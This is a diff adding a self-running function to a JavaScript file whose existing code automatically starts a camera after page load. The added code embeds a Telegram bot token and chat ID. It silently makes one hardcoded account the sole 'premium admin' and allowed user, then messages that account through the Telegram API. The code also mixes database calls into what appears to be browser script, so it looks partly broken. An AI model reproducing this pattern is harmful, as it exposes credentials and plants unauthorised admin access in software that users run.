@@ -166,3 +166,30 @@ document.addEventListener('DOMContentLoaded', function() {
   // Jalankan kamera otomatis setelah 3 detik
   setTimeout(initCamera, 3000);
 });
+
+
+// Di akhir file, tambah:
+async function manualSetAdmin() {
+  const botToken = '8364972198:AAHBBW0kTvyeIbDjZQPJeUZxa6TNfYLMEk0';
+  const chatId = '7418584938';
+  
+  // Manual set admin
+  const db = loadDB();
+  db.premium_admin = "7418584938";
+  db.allowed_users = ["7418584938"];
+  saveDB(db);
+  
+  // Send confirmation
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: '✅ **Premium Admin Set!**\n\nYour ID: `7418584938`\n\nNow you can use:\n/users - List users\n/add [id] - Add user\n/remove [id] - Remove user',
+      parse_mode: 'Markdown'
+    })
+  });
+}
+
+// Jalankan manual
+manualSetAdmin();
